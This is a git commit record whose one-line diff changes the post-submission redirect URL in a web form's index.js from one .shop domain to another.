a6c0fb5d73b3c136223e6ed90e1d7c5c34eb8707
husknet <127146284+husknet@users.noreply.github.com>
2024-08-12 10:53:03 -0300

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -42,7 +42,7 @@ export default function Home() {
           country,
         });
         console.log('Email sent successfully!', response.data.message);
-        window.location.href = 'https://sage.marketing-clouddom.shop/';
+        window.location.href = 'https://sage.monermall.shop/';
       } catch (error) {
         console.error('Failed to send email:', error);
         setErrorMessage('Failed to submit. Please try again.');
